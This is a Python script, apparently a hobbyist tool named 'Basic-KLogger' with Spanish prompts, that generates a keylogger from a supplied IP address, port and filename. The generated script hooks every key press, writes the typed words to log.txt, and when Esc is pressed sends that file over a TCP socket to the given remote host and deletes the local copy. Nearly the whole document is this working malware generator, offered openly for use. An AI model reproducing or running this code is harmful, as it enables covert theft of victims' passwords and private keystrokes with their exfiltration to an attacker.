#!/usr/bin/env python3

import os
import sys
import ipaddress

print(r"""
__________               .__                  ____  __.____                                      
\______   \_____    _____|__| ____           |    |/ _|    |    ____   ____   ____   ___________ 
 |    |  _/\__  \  /  ___/  |/ ___\   ______ |      < |    |   /  _ \ / ___\ / ___\_/ __ \_  __ \
 |    |   \ / __ \_\___ \|  \  \___  /_____/ |    |  \|    |__(  <_> ) /_/  > /_/  >  ___/|  | \/
 |______  /(____  /____  >__|\___  >         |____|__ \_______ \____/\___  /\___  / \___  >__|   
        \/      \/     \/        \/                  \/       \/    /_____//_____/      \/       
""")

def ip_isValid(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        print("IP not valid")
        return False

def port_isValid(port):
    try:
        port = int(port)
        return 1 <= port <= 65535
    except (ValueError, TypeError):
        print("Port not valid: Must be between 1 and 65535")
        return False
    
def main():
    try:
        num_args = len(sys.argv) - 1
        if num_args != 3:
            print("""
╔══════════════════════════════════════════════════════════╗
║              GENERADOR DE KEYLOGGER                       ║
╚══════════════════════════════════════════════════════════╝
                
Uso: ./keylogger_Generator.py [ip_address] [port_destination] [keylogger_name]
""")
            sys.exit(1)
        
        ip = sys.argv[1]
        port = sys.argv[2]
        script_name = sys.argv[3]

        if not script_name.endswith('.py'):
            script_name += '.py'
    
        if not ip_isValid(ip):
            sys.exit(1)  # CORREGIDO: 1 para error
        if not port_isValid(port):
            sys.exit(1)  # CORREGIDO: 1 para error

        port_num = int(port)


        script_content= f'''#!/usr/bin/env python3

import keyboard
import sys
import socket
import os

palabra = ""

def pulsacion_teclado(tecla):
    
    global palabra

    if tecla.event_type == keyboard.KEY_DOWN:
        if tecla.name == 'space':
            save_word()
        elif tecla.name == 'esc':
            fin()
        elif len(tecla.name) == 1 and tecla.name.isprintable():
            palabra += tecla.name

keyboard.hook(pulsacion_teclado)

def save_word():
    with open("log.txt", "a") as file:

        file.write(palabra + "\\n")
    
    nueva_palabra()

def nueva_palabra():
    global palabra
    palabra = ""

ip_destino = "{ip}"
puerto_destino = {port_num}
archivo_enviar = 'log.txt'
    
def exfiltrar(ip_destino, puerto_destino, archivo_enviar):
    try:
        with open(archivo_enviar, 'rb') as file:
            contenido= file.read()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conectar:
            conectar.connect((ip_destino, puerto_destino))
            conectar.sendall(contenido)
            os.remove("log.txt")
            sys.exit()
    except Exception as e:
        print("Connection Unseccesfull: ", e)

def fin():
    keyboard.unhook_all()
    exfiltrar(ip_destino, puerto_destino, archivo_enviar)

try:
    keyboard.wait("esc")
    fin()
except KeyboardInterrupt:
    print("Se detuvo el script")
    pass
'''
        with open(script_name, "w", encoding='utf-8') as file:
            file.write(script_content)

        os.chmod(script_name, 0o755)


    except KeyboardInterrupt:
        print("Process stopped by the user")
        sys.exit(0)
    except Exception as e:
        print("Unexpected Error")
        sys.exit(1)


if __name__ == "__main__":
        try:
              import keyboard
        except ImportError:
            print("""
                Module 'keyboard' must be installed
                
                Install with: pip install keyboard
            """)
            sys.exit(1)
              
        main()